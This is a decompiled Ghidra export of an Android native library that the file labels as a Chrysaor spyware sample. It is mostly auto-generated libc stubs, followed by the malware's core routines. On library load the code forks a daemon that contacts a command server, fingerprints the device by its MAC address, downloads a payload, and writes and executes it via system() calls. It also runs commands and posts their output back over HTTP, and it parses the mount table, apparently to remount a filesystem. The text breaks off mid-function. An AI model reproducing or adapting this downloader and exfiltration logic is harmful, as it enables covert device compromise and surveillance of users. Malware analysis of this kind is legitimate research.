/* Decompiled stubs: libsgn.so */
/* Ghidra headless export - Chrysaor canonical sample */

/* === fcntl @ 0001198c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fcntl(int __fd,int __cmd,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fcntl_00015f10)(__fd);
  return iVar1;
}


/* === memset @ 00011998 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memset(void *__s,int __c,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memset_00015f14)(__s);
  return pvVar1;
}


/* === read @ 000119a4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t read(int __fd,void *__buf,size_t __nbytes)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_read_00015f18)(__fd);
  return sVar1;
}


/* === pthread_exit @ 000119b0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void pthread_exit(void *__retval)

{
  (*(code *)PTR_pthread_exit_00015f1c)(__retval);
  return;
}


/* === __stack_chk_fail @ 000119bc === */

void __stack_chk_fail(void)

{
  (*(code *)PTR___stack_chk_fail_00015f20)();
  return;
}


/* === clock_gettime @ 000119c8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int clock_gettime(clockid_t __clock_id,timespec *__tp)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_clock_gettime_00015f24)(__clock_id);
  return iVar1;
}


/* === getpid @ 000119d4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t getpid(void)

{
  __pid_t _Var1;
  
  _Var1 = (*(code *)PTR_getpid_00015f28)();
  return _Var1;
}


/* === snprintf @ 000119e0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int snprintf(char *__s,size_t __maxlen,char *__format,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_snprintf_00015f2c)(__s);
  return iVar1;
}


/* === select @ 000119ec === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int select(int __nfds,fd_set *__readfds,fd_set *__writefds,fd_set *__exceptfds,timeval *__timeout)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_select_00015f30)(__nfds);
  return iVar1;
}


/* === __errno @ 000119f8 === */

void __errno(void)

{
  (*(code *)PTR___errno_00015f34)();
  return;
}


/* === realloc @ 00011a04 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * realloc(void *__ptr,size_t __size)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_realloc_00015f38)(__ptr);
  return pvVar1;
}


/* === memcpy @ 00011a10 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memcpy(void *__dest,void *__src,size_t __n)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memcpy_00015f3c)(__dest);
  return pvVar1;
}


/* === free @ 00011a1c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void free(void *__ptr)

{
  (*(code *)PTR_free_00015f40)(__ptr);
  return;
}


/* === pthread_attr_init @ 00011a28 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_attr_init(pthread_attr_t *__attr)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_attr_init_00015f44)(__attr);
  return iVar1;
}


/* === pthread_attr_setdetachstate @ 00011a34 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_attr_setdetachstate(pthread_attr_t *__attr,int __detachstate)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_attr_setdetachstate_00015f48)(__attr);
  return iVar1;
}


/* === pthread_create @ 00011a40 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_create(pthread_t *__newthread,pthread_attr_t *__attr,__start_routine *__start_routine,
                  void *__arg)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_create_00015f4c)(__newthread);
  return iVar1;
}


/* === bsd_signal @ 00011a4c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__sighandler_t bsd_signal(int __sig,__sighandler_t __handler)

{
  __sighandler_t p_Var1;
  
  p_Var1 = (__sighandler_t)(*(code *)PTR_bsd_signal_00015f50)(__sig);
  return p_Var1;
}


/* === sleep @ 00011a58 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

uint sleep(uint __seconds)

{
  uint uVar1;
  
  uVar1 = (*(code *)PTR_sleep_00015f54)(__seconds);
  return uVar1;
}


/* === geteuid @ 00011a64 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__uid_t geteuid(void)

{
  __uid_t _Var1;
  
  _Var1 = (*(code *)PTR_geteuid_00015f58)();
  return _Var1;
}


/* === system @ 00011a70 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int system(char *__command)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_system_00015f5c)(__command);
  return iVar1;
}


/* === unlink @ 00011a7c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int unlink(char *__name)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_unlink_00015f60)(__name);
  return iVar1;
}


/* === fork @ 00011a88 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t fork(void)

{
  __pid_t _Var1;
  
  _Var1 = (*(code *)PTR_fork_00015f64)();
  return _Var1;
}


/* === daemon @ 00011a94 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int daemon(int __nochdir,int __noclose)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_daemon_00015f68)(__nochdir);
  return iVar1;
}


/* === fopen @ 00011aa0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fopen(char *__filename,char *__modes)

{
  FILE *pFVar1;
  
  pFVar1 = (FILE *)(*(code *)PTR_fopen_00015f6c)(__filename);
  return pFVar1;
}


/* === strlen @ 00011aac === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t strlen(char *__s)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_strlen_00015f70)(__s);
  return sVar1;
}


/* === fgets @ 00011ab8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

char * fgets(char *__s,int __n,FILE *__stream)

{
  char *pcVar1;
  
  pcVar1 = (char *)(*(code *)PTR_fgets_00015f74)(__s);
  return pcVar1;
}


/* === fgetc @ 00011ac4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fgetc(FILE *__stream)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fgetc_00015f78)(__stream);
  return iVar1;
}


/* === memcmp @ 00011ad0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int memcmp(void *__s1,void *__s2,size_t __n)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_memcmp_00015f7c)(__s1);
  return iVar1;
}


/* === mount @ 00011adc === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int mount(char *__special_file,char *__dir,char *__fstype,ulong __rwflag,void *__data)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_mount_00015f80)(__special_file);
  return iVar1;
}


/* === fclose @ 00011ae8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int fclose(FILE *__stream)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_fclose_00015f84)(__stream);
  return iVar1;
}


/* === fwrite @ 00011af4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t fwrite(void *__ptr,size_t __size,size_t __n,FILE *__s)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_fwrite_00015f88)(__ptr);
  return sVar1;
}


/* === chmod @ 00011b00 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int chmod(char *__file,__mode_t __mode)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_chmod_00015f8c)(__file);
  return iVar1;
}


/* === stat @ 00011b0c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int stat(char *__file,stat *__buf)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_stat_00015f90)(__file);
  return iVar1;
}


/* === socket @ 00011b18 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int socket(int __domain,int __type,int __protocol)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_socket_00015f94)(__domain);
  return iVar1;
}


/* === inet_addr @ 00011b24 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

in_addr_t inet_addr(char *__cp)

{
  in_addr_t iVar1;
  
  iVar1 = (*(code *)PTR_inet_addr_00015f98)(__cp);
  return iVar1;
}


/* === connect @ 00011b30 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int connect(int __fd,sockaddr *__addr,socklen_t __len)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_connect_00015f9c)(__fd);
  return iVar1;
}


/* === close @ 00011b3c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int close(int __fd)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_close_00015fa0)(__fd);
  return iVar1;
}


/* === malloc @ 00011b48 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * malloc(size_t __size)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_malloc_00015fa4)(__size);
  return pvVar1;
}


/* === send @ 00011b54 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t send(int __fd,void *__buf,size_t __n,int __flags)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_send_00015fa8)(__fd);
  return sVar1;
}


/* === poll @ 00011b60 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int poll(pollfd *__fds,nfds_t __nfds,int __timeout)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_poll_00015fac)(__fds);
  return iVar1;
}


/* === recv @ 00011b6c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

ssize_t recv(int __fd,void *__buf,size_t __n,int __flags)

{
  ssize_t sVar1;
  
  sVar1 = (*(code *)PTR_recv_00015fb0)(__fd);
  return sVar1;
}


/* === pipe @ 00011b78 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pipe(int *__pipedes)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pipe_00015fb4)(__pipedes);
  return iVar1;
}


/* === pthread_rwlock_rdlock @ 00011b84 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_rdlock(pthread_rwlock_t *__rwlock)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_rwlock_rdlock_00015fb8)(__rwlock);
  return iVar1;
}


/* === pthread_rwlock_unlock @ 00011b90 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_unlock(pthread_rwlock_t *__rwlock)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_rwlock_unlock_00015fbc)(__rwlock);
  return iVar1;
}


/* === dup2 @ 00011b9c === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int dup2(int __fd,int __fd2)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_dup2_00015fc0)(__fd);
  return iVar1;
}


/* === execve @ 00011ba8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int execve(char *__path,char **__argv,char **__envp)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_execve_00015fc4)(__path);
  return iVar1;
}


/* === _exit @ 00011bb4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void _exit(int __status)

{
  (*(code *)PTR__exit_00015fc8)(__status);
  return;
}


/* === fdopen @ 00011bc0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

FILE * fdopen(int __fd,char *__modes)

{
  FILE *pFVar1;
  
  pFVar1 = (FILE *)(*(code *)PTR_fdopen_00015fcc)(__fd);
  return pFVar1;
}


/* === pthread_rwlock_wrlock @ 00011bcc === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int pthread_rwlock_wrlock(pthread_rwlock_t *__rwlock)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_pthread_rwlock_wrlock_00015fd0)(__rwlock);
  return iVar1;
}


/* === waitpid @ 00011bd8 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

__pid_t waitpid(__pid_t __pid,int *__stat_loc,int __options)

{
  __pid_t _Var1;
  
  _Var1 = (*(code *)PTR_waitpid_00015fd4)(__pid);
  return _Var1;
}


/* === memmem @ 00011be4 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void * memmem(void *__haystack,size_t __haystacklen,void *__needle,size_t __needlelen)

{
  void *pvVar1;
  
  pvVar1 = (void *)(*(code *)PTR_memmem_00015fd8)(__haystack);
  return pvVar1;
}


/* === strtol @ 00011bf0 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

long strtol(char *__nptr,char **__endptr,int __base)

{
  long lVar1;
  
  lVar1 = (*(code *)PTR_strtol_00015fdc)(__nptr);
  return lVar1;
}


/* === open @ 00011bfc === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int open(char *__file,int __oflag,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_open_00015fe0)(__file);
  return iVar1;
}


/* === time @ 00011c08 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

time_t time(time_t *__timer)

{
  time_t tVar1;
  
  tVar1 = (*(code *)PTR_time_00015fe4)(__timer);
  return tVar1;
}


/* === fread @ 00011c14 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

size_t fread(void *__ptr,size_t __size,size_t __n,FILE *__stream)

{
  size_t sVar1;
  
  sVar1 = (*(code *)PTR_fread_00015fe8)(__ptr);
  return sVar1;
}


/* === sscanf @ 00011c20 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int sscanf(char *__s,char *__format,...)

{
  int iVar1;
  
  iVar1 = (*(code *)PTR_sscanf_00015fec)(__s);
  return iVar1;
}


/* === __gnu_Unwind_Find_exidx @ 00011c2c === */

void __gnu_Unwind_Find_exidx(void)

{
  (*(code *)PTR___gnu_Unwind_Find_exidx_00015ff0)();
  return;
}


/* === abort @ 00011c38 === */

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void abort(void)

{
  (*(code *)PTR_abort_00015ff4)();
  return;
}


/* === __cxa_begin_cleanup @ 00011c44 === */

void __cxa_begin_cleanup(void)

{
  (*(code *)PTR___cxa_begin_cleanup_00015ff8)();
  return;
}


/* === __cxa_type_match @ 00011c50 === */

void __cxa_type_match(void)

{
  (*(code *)PTR___cxa_type_match_00015ffc)();
  return;
}


/* === _FINI_0 @ 00011c70 === */

void _FINI_0(void)

{
  (*(code *)PTR___cxa_finalize_00015f0c)((int)&DAT_00011c7c + DAT_00011c7c);
  return;
}


/* === FUN_00011c80 @ 00011c80 === */

void FUN_00011c80(int param_1)

{
  short sVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  
  iVar2 = DAT_00011cec;
  *(undefined4 *)(&stack0x000003f4 + DAT_00011cec) = **(undefined4 **)(DAT_00011cf0 + 0x11c94);
  sVar1 = *(short *)(param_1 + 0xe);
  iVar3 = fcntl((int)sVar1,4,0);
  if (iVar3 == 0) {
    do {
      memset(&stack0xfffffff4 + iVar2,0,0x400);
      sVar4 = read((int)sVar1,&stack0xfffffff4 + iVar2,0x400);
      if (sVar4 == -1) break;
    } while (sVar4 != 0);
  }
  xpclose(param_1);
                    /* WARNING: Subroutine does not return */
  pthread_exit((void *)0x0);
}


/* === FUN_00011cf4 @ 00011cf4 === */

void FUN_00011cf4(undefined4 param_1,int param_2,int param_3,undefined4 param_4)

{
  int iVar1;
  int iVar2;
  __pid_t _Var3;
  int iVar4;
  int *piVar5;
  size_t __n;
  void *__ptr;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 *puVar9;
  uint uVar10;
  __pid_t *p_Var11;
  undefined4 *puVar12;
  undefined4 *puVar13;
  int *piVar14;
  
  iVar1 = DAT_00011ee4;
  p_Var11 = (__pid_t *)(&stack0xffffffec + DAT_00011ee4);
  puVar12 = (undefined4 *)(&stack0xffffffec + DAT_00011ee4);
  puVar13 = (undefined4 *)(&stack0xffffffec + DAT_00011ee4);
  piVar14 = (int *)(&stack0xffffffec + DAT_00011ee4);
  puVar9 = *(undefined4 **)(DAT_00011eec + 0x11d0a);
  *(undefined4 *)(&stack0x00000010 + DAT_00011ee4) =
       *(undefined4 *)(&stack0xffffffec + DAT_00011ee8 + DAT_00011ee4);
  uVar6 = *(undefined4 *)(&stack0xffffffec + DAT_00011ef0 + DAT_00011ee4);
  *(undefined4 *)(&stack0x0000000c + DAT_00011ee4) = param_4;
  uVar8 = *puVar9;
  *(undefined4 *)(&stack0x00000008 + DAT_00011ee4) = param_1;
  *(undefined4 *)(&stack0xffffffec + DAT_00011ef4 + DAT_00011ee4) = uVar8;
  *(undefined4 *)(&stack0x00000014 + DAT_00011ee4) = uVar6;
  memset(&stack0x00000038 + DAT_00011ee4,0,0x10);
  *(undefined4 *)(&stack0x00000020 + iVar1) = 0;
  *(undefined4 *)(&stack0x00000024 + iVar1) = 0;
  iVar2 = clock_gettime(1,(timespec *)(&stack0x00000020 + iVar1));
  *(undefined4 **)(&stack0x00000018 + iVar1) = puVar9;
  if (iVar2 != -1) {
    if (param_3 == 0) {
      _Var3 = getpid();
      iVar2 = snprintf(&stack0x000004c8 + iVar1,DAT_00011efc,(char *)(DAT_00011f04 + 0x11d7e),_Var3)
      ;
      if (0 < iVar2) {
        *(int *)(&stack0x00000038 + iVar1) = param_2;
        *(undefined1 **)(&stack0x0000003c + iVar1) = &stack0x000004c8 + iVar1;
        *(undefined4 *)(&stack0x00000040 + iVar1) = 0;
        goto LAB_00011d94;
      }
    }
    else {
      _Var3 = getpid();
      *p_Var11 = _Var3;
      iVar2 = snprintf(&stack0x000004c8 + iVar1,DAT_00011efc,(char *)(DAT_00011ef8 + 0x11d52),
                       param_2);
      if (0 < iVar2) {
        param_2 = DAT_00011f00 + 0x11d6a;
        *(int *)(&stack0x00000038 + iVar1) = param_2;
        *(undefined1 **)(&stack0x0000003c + iVar1) = &stack0x000004c8 + iVar1;
        *(undefined4 *)(&stack0x00000040 + iVar1) = 0;
LAB_00011d94:
        iVar2 = xpopen(param_2,&stack0x00000038 + iVar1);
        *(int *)(&stack0xfffffff8 + iVar1) = iVar2;
        if (iVar2 != 0) {
          uVar10 = (uint)*(short *)(iVar2 + 0xe);
          if (((int)uVar10 < 1) || (iVar2 = fcntl(uVar10,4,0x800), iVar2 != 0)) {
LAB_00011ece:
            if (*(int *)(&stack0xfffffff8 + iVar1) == 0) goto LAB_00011ed4;
            uVar10 = 0;
          }
          else {
            *(int *)(&stack0x00000000 + iVar1) = (int)uVar10 >> 5;
            *(int *)(&stack0x00000004 + iVar1) = 1 << (uVar10 & 0x1f);
            __ptr = (void *)0x0;
            iVar2 = 0;
LAB_00011dd2:
            do {
              *(undefined4 *)(&stack0x00000028 + iVar1) = 0;
              *(undefined4 *)(&stack0x0000002c + iVar1) = 0;
              *(undefined4 *)(&stack0x00000030 + iVar1) = 0;
              *(undefined4 *)(&stack0x00000034 + iVar1) = 0;
              iVar4 = clock_gettime(1,(timespec *)(&stack0x00000030 + iVar1));
              if (iVar4 == -1) {
LAB_00011e82:
                uVar10 = 0;
                goto LAB_00011e84;
              }
              if (7 < *(int *)(&stack0x00000030 + iVar1) - *(int *)(&stack0x00000020 + iVar1))
              break;
              *(undefined4 *)(&stack0x00000028 + iVar1) = 1;
              *(undefined4 *)(&stack0x0000002c + iVar1) = 0;
              memset(&stack0x00000048 + iVar1,0,0x80);
              *(undefined4 *)(&stack0x00000048 + *(int *)(&stack0x00000000 + iVar1) * 4 + iVar1) =
                   *(undefined4 *)(&stack0x00000004 + iVar1);
              *puVar12 = &stack0x00000028 + iVar1;
              iVar4 = select(uVar10 + 1,(fd_set *)(&stack0x00000048 + iVar1),(fd_set *)0x0,
                             (fd_set *)0x0,(timeval *)*puVar13);
              if (-1 < iVar4) {
                if (iVar4 != 0) {
                  __n = read(uVar10,&stack0x000000c8 + iVar1,0x400);
                  if (__n == 0xffffffff) goto LAB_00011e82;
                  if (__n == 0) break;
                  *(size_t *)(&stack0xfffffffc + iVar1) = iVar2 + __n;
                  __ptr = realloc(__ptr,iVar2 + __n);
                  if (__ptr == (void *)0x0) goto LAB_00011ece;
                  memcpy((void *)((int)__ptr + iVar2),&stack0x000000c8 + iVar1,__n);
                  iVar2 = *(int *)(&stack0xfffffffc + iVar1);
                }
                goto LAB_00011dd2;
              }
              piVar5 = (int *)__errno();
            } while (*piVar5 == 4);
            uVar6 = *(undefined4 *)(&stack0x0000000c + iVar1);
            *(undefined4 *)(&stack0xfffffff0 + iVar1) = *(undefined4 *)(&stack0x00000008 + iVar1);
            uVar8 = *(undefined4 *)(&stack0x00000010 + iVar1);
            uVar7 = *(undefined4 *)(&stack0x00000014 + iVar1);
            *piVar14 = iVar2;
            uVar10 = http_send_response_with_post(uVar6,uVar8,uVar7,__ptr);
            uVar10 = -(uint)(uVar10 == 1) & uVar10;
LAB_00011e84:
            if (__ptr != (void *)0x0) {
              free(__ptr);
            }
          }
          memset(&stack0x00000048 + iVar1,0,0x18);
          pthread_attr_init((pthread_attr_t *)(&stack0x00000048 + iVar1));
          pthread_attr_setdetachstate((pthread_attr_t *)(&stack0x00000048 + iVar1),1);
          *(undefined4 *)(&stack0x0000001c + iVar1) = 0;
          pthread_create((pthread_t *)(&stack0x0000001c + iVar1),
                         (pthread_attr_t *)(&stack0x00000048 + iVar1),
                         (__start_routine *)(DAT_00011f08 + 0x11eb4),
                         *(void **)(&stack0xfffffff8 + iVar1));
          goto LAB_00011ebc;
        }
      }
    }
  }
LAB_00011ed4:
  uVar10 = 0;
LAB_00011ebc:
  if (*(int *)(&stack0xffffffec + DAT_00011ef4 + iVar1) == **(int **)(&stack0x00000018 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar10);
}


/* === handle_signals @ 00011f10 === */

void handle_signals(void)

{
  bsd_signal(0xd,(__sighandler_t)0x1);
  return;
}


/* === main @ 00011f1c === */

void main(void)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  char *__format;
  undefined4 uVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  uint *puVar8;
  undefined4 uVar9;
  int *piVar10;
  
  iVar2 = DAT_000120c4;
  piVar10 = (int *)(&stack0xffffffec + DAT_000120c4);
  puVar6 = *(undefined4 **)(DAT_000120c8 + 0x11f30);
  uVar5 = *puVar6;
  *(undefined4 *)(&stack0x00000008 + DAT_000120c4) = 0;
  *(undefined4 *)(&stack0x0000000c + DAT_000120c4) = 0;
  *(undefined4 *)(&stack0x00000470 + DAT_000120c4) = uVar5;
  *(undefined4 *)(&stack0x00000010 + DAT_000120c4) = 0;
  memset(&stack0x00000070 + DAT_000120c4,0,0x400);
  memset(&stack0x00000028 + iVar2,0,0x21);
  memset(&stack0x00000018 + iVar2,0,0xd);
  puVar7 = (undefined4 *)(DAT_000120cc + 0x11f64);
  memset(&stack0x0000004c + iVar2,0,0x21);
  handle_signals();
  puVar8 = (uint *)*puVar7;
  *puVar8 = 0x1e;
  sleep(0x1e);
  geteuid();
  *(undefined4 **)(&stack0x00000000 + iVar2) = puVar6;
  do {
    bVar1 = false;
    puVar6 = *(undefined4 **)(DAT_000120d0 + 0x11f86);
    iVar3 = socket_connect(&stack0x00000008 + iVar2,*puVar6,puVar6[1]);
    if (iVar3 == 1) {
      get_random_hexlified_md5(&stack0x00000028 + iVar2);
      get_mac_address(&stack0x00000018 + iVar2);
      get_hexlified_md5(&stack0x00000018 + iVar2,&stack0x0000004c + iVar2,0xc);
      iVar3 = http_send_request_with_get
                        (&stack0x0000004c + iVar2,&stack0x00000028 + iVar2,*puVar6,
                         *(undefined4 *)(&stack0x00000008 + iVar2));
      if ((iVar3 == 1) &&
         (iVar3 = http_receive_payload
                            (*(undefined4 *)(&stack0x00000008 + iVar2),&stack0x00000010 + iVar2,
                             &stack0x0000000c + iVar2), iVar3 == 1)) {
        socket_disconnect(&stack0x00000008 + iVar2);
        iVar3 = socket_connect(&stack0x00000008 + iVar2,*puVar6,puVar6[1]);
        if (iVar3 == 1) {
          iVar3 = *(int *)(&stack0x0000000c + iVar2);
          bVar1 = true;
          if (0 < iVar3) {
            uVar5 = *puVar6;
            *(undefined4 *)(&stack0xfffffff8 + iVar2) = *(undefined4 *)(&stack0x00000008 + iVar2);
            uVar9 = *(undefined4 *)(&stack0x00000010 + iVar2);
            *(undefined4 *)(&stack0xfffffffc + iVar2) = uVar5;
            *(undefined4 *)(&stack0x00000014 + iVar2) = 0;
            iVar4 = file_exists(DAT_000120d4 + 0x11ff0,&stack0x00000014 + iVar2);
            if (iVar4 == 1) {
              if (*(int *)(&stack0x00000014 + iVar2) == 0) {
                iVar4 = DAT_000120f4 + 0x1204e;
                iVar3 = write_buffer_as_executable(uVar9,iVar3,iVar4);
                if (iVar3 == 1) {
                  __format = (char *)(DAT_000120f8 + 0x12060);
                  goto LAB_00012060;
                }
              }
              else {
                iVar3 = write_buffer_as_executable(uVar9,iVar3,DAT_000120d8 + 0x12010);
                if (((iVar3 == 1) && (iVar3 = system((char *)(DAT_000120dc + 0x1201c)), iVar3 != -1)
                    ) && (iVar3 = system((char *)(DAT_000120e0 + 0x12028)), iVar3 != -1)) {
                  unlink((char *)(DAT_000120e4 + 0x12034));
                  __format = (char *)(DAT_000120e8 + 0x12040);
                  iVar4 = DAT_000120ec + 0x12042;
LAB_00012060:
                  iVar3 = snprintf(&stack0x00000070 + iVar2,DAT_000120f0,__format,iVar4);
                  if (0 < iVar3) {
                    *piVar10 = (int)(&stack0x00000028 + iVar2);
                    *(undefined4 *)(&stack0xfffffff0 + iVar2) =
                         *(undefined4 *)(&stack0xfffffffc + iVar2);
                    iVar3 = FUN_00011cf4(*(undefined4 *)(&stack0xfffffff8 + iVar2),
                                         &stack0x00000070 + iVar2,
                                         *(undefined4 *)(&stack0x00000014 + iVar2),
                                         &stack0x0000004c + iVar2);
                    bVar1 = true;
                    if (iVar3 == 1) goto LAB_00012084;
                  }
                }
              }
            }
            bVar1 = false;
          }
        }
      }
    }
LAB_00012084:
    if (*(void **)(&stack0x00000010 + iVar2) != (void *)0x0) {
      free(*(void **)(&stack0x00000010 + iVar2));
      *(undefined4 *)(&stack0x00000010 + iVar2) = 0;
    }
    socket_disconnect(&stack0x00000008 + iVar2);
    if (bVar1) {
                    /* WARNING: Subroutine does not return */
      pthread_exit((void *)0x0);
    }
    sleep(*puVar8);
  } while( true );
}


/* === JNI_OnLoad @ 00012100 === */

undefined4 JNI_OnLoad(void)

{
  __pid_t _Var1;
  
  _Var1 = fork();
  if (_Var1 == 0) {
    daemon(0,0);
    main();
  }
  return DAT_00012118;
}


/* === remount_filesystem @ 0001211c === */

void remount_filesystem(undefined4 param_1,undefined4 param_2)

{
  char *__s;
  int iVar1;
  FILE *__stream;
  size_t __n;
  char *pcVar2;
  int iVar3;
  size_t sVar4;
  uint uVar5;
  uint uVar6;
  undefined4 *puVar7;
  uint uVar8;
  int *piVar9;
  bool bVar11;
  undefined4 *puVar10;
  
  iVar1 = DAT_0001223c;
  piVar9 = (int *)(&stack0xffffffec + DAT_0001223c);
  puVar10 = (undefined4 *)(&stack0xffffffec + DAT_0001223c);
  *(undefined4 *)(&stack0xfffffffc + DAT_0001223c) = param_2;
  puVar7 = *(undefined4 **)(DAT_00012240 + 0x1212c);
  *(undefined4 *)(&stack0xfffffff4 + DAT_0001223c) = param_1;
  *(undefined4 *)(&stack0x00000408 + DAT_0001223c) = *puVar7;
  __stream = fopen((char *)(DAT_00012244 + 0x1213c),(char *)(DAT_00012248 + 0x1213e));
  *(undefined4 **)(&stack0x00000000 + iVar1) = puVar7;
  bVar11 = false;
  if (__stream != (FILE *)0x0) {
    __n = strlen(*(char **)(&stack0xfffffff4 + iVar1));
    __s = &stack0x00000008 + iVar1;
LAB_00012152:
    do {
      memset(__s,0,0x400);
      pcVar2 = fgets(__s,0x400,__stream);
      if (pcVar2 == (char *)0x0) {
        bVar11 = false;
        goto LAB_0001220c;
      }
      if ((__s[DAT_0001224c] == '\0') || (__s[DAT_0001224c] == '\n')) {
        uVar5 = 0;
        do {
          uVar8 = uVar5;
          uVar5 = uVar8 + 1;
          if (uVar8 == 0x400) break;
        } while (__s[uVar8] != ' ');
        do {
          uVar6 = uVar5;
          uVar5 = uVar6 + 1;
          if (DAT_00012250 < uVar6) break;
        } while (__s[uVar6] != ' ');
        do {
          if (DAT_00012250 < uVar5) {
            bVar11 = false;
            goto LAB_0001220c;
          }
          if (__s[uVar5] == ' ') goto LAB_00012214;
          uVar5 = uVar5 + 1;
        } while( true );
      }
      do {
        iVar3 = fgetc(__stream);
        if (iVar3 == -1) break;
      } while (iVar3 != 10);
    } while( true );
  }
LAB_000121f4:
  if (*(int *)(&stack0x00000408 + iVar1) == **(int **)(&stack0x00000000 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(bVar11);
LAB_00012214:
  __s[uVar8] = '\0';
  __s[uVar6] = '\0';
  pcVar2 = __s + uVar8 + 1;
  __s[uVar5] = '\0';
  *(char **)(&stack0xfffffff8 + iVar1) = __s + uVar6 + 1;
  sVar4 = strlen(pcVar2);
  if ((__n != sVar4) ||
     (iVar3 = memcmp(*(void **)(&stack0xfffffff4 + iVar1),pcVar2,__n), iVar3 != 0))
  goto LAB_00012152;
  uVar5 = *(uint *)(&stack0xfffffffc + iVar1);
  *piVar9 = DAT_00012254 + 0x121e8;
